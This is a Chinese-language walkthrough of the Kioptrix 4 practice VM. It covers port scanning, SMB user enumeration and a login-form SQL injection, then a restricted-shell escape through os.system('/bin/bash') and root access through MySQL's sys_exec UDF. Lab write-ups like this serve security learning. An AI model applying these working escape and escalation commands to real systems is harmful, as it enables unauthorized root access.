打开靶机，和kali攻击机在同一网段

### 信息收集
用arp-scan和nmap获取机器IP为192.168.159.132

#### 端口扫描
```
msf$ db_nmap -sT -sV -p 1-65535 192.168.159.132
msf$ services 192.168.159.132
host             port  proto  name         state  info
----             ----  -----  ----         -----  ----
192.168.159.132  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1.2 protocol 2.0
192.168.159.132  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
192.168.159.132  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
192.168.159.132  445   tcp    smb          open   Unix (Samba 3.0.28a)
```

#### web
测试了以下密码字段可以sql注入`a' or 1=1 -- `，但是sqlmap注入不出来，调整risk和level没有效果

#### smb信息探测
用nmap的脚本或者msf的扫描
```
root@kali:~/test# nmap --script smb-enum-users 192.168.159.132
Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account
```

```
msf5 auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/smb/smb_enumusers 
msf5 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.159.132
RHOSTS => 192.168.159.132
msf5 auxiliary(scanner/smb/smb_enumusers) > run

[+] 192.168.159.132:139   - KIOPTRIX4 [ nobody, robert, root, john, loneferret ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.168.159.132:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 漏洞分析
`searchsploit`后没有发现什么可以利用的漏洞版本

smb服务发现一些用户信息，可以使用ssh暴破弱口令尝试

### 漏洞利用
实在没有发现什么可以利用的地方，看别人writeup使用smb暴破出来的john加上使用密码表单提交`a' or 1=1 -- `会返回密码，实际中并没有返回密码，但是返回界面确实一样，于是怀疑是sqlmap注入的时候破坏了数据表，但是sqlmap没有成功注入

使用网上writeup的john用户的密码登录
```
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

### 后渗透利用
发现shell的命令是在少，没有可以利用的地方，也无法查看重要的目录，sudo、suid、cron等方式都无法使用

又没有办法提权，查看别的writeup使用了ubuntu默认使用python的特性，可以提权
```
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ help
```

对这种方式表示惊呆了，然后对公司多个主机使用此方式切换shell尝试均无效，所以不研究了。。。

获取bash后查看sudo不能使用，suid不想一个个看过去，cron没有人用，尝试软件或者linux版本是否能提权

`ps -ef |grep root`，能看到mysql用root启动

尝试mysql提权，查看资料有UDF提权

```
john@Kioptrix4:~$ locate udf
/lib/modules/2.6.24-24-server/kernel/fs/udf
/lib/modules/2.6.24-24-server/kernel/fs/udf/udf.ko
/usr/lib/lib_mysqludf_sys.so
/usr/share/mysql/mysql-test/include/have_udf.inc
/usr/share/mysql/mysql-test/r/have_udf.require
/usr/share/mysql/mysql-test/r/have_udf_example.require
/usr/share/mysql/mysql-test/r/udf.result
/usr/share/mysql/mysql-test/t/udf.test
john@Kioptrix4:~$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select * from mysql.func
    -> ;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    1
Current database: *** NONE ***

+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.05 sec)

mysql> exit
Bye
john@Kioptrix4:~$ sudo su
[sudo] password for john: 
root@Kioptrix4:/home/john# whoami
root
```

### 其他
这次完全不能提权，知识面有限，全靠别人writeup
